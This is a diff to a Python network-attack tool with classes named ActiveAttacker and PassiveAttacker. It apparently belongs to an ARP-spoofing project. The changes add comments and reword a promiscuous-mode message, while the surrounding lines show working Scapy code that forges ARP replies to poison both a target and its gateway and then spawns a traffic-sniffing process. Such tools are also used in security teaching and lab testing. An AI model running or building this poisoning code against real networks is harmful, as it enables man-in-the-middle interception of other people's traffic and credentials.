@@ -102,6 +102,7 @@ class ActiveAttacker:
     def poison(self, arper: Arper, event: Event):   # type: ignore
         # If you press CTRL-C, it terminates immediately
         signal.signal(signal.SIGINT, signal.SIG_DFL)
+        # Craft packets aimed at the target device
         ether1 = Ether(dst=arper.target_mac)
         arp1 = ARP(op=2, psrc=arper.gateway, pdst=arper.target, hwdst=arper.target_mac)
         poison_target = ether1 / arp1
@@ -112,7 +113,8 @@ class ActiveAttacker:
         print(f'MAC dst: {poison_target[Ether].dst}')
         print(poison_target.summary())
         print('-' * 30)
-
+        
+        # Craft packets aimed at the gateway
         ether2 = Ether(dst=arper.gateway_mac)
         arp2 = ARP(op=2, psrc=arper.target, pdst=arper.gateway, hwdst=arper.gateway_mac)
         poison_gateway = ether2 / arp2
@@ -264,7 +266,7 @@ class PassiveAttacker:
 
     def start(self, arper: Arper):
         self.iface = arper.interface
-        print(f"{RED_BOLD}Please ensure that the network card's promiscuous mode has been enabled. {RESET}")
+        print(f"{RED_BOLD}Ensure that promiscuous mode is enabled for the interface at least. {RESET}")
         try:
             poison_process = Process(target=self.poison, args=[arper])
             arper.sniff_process = Process(target=self.sniff_and_store, args=[arper, poison_process])
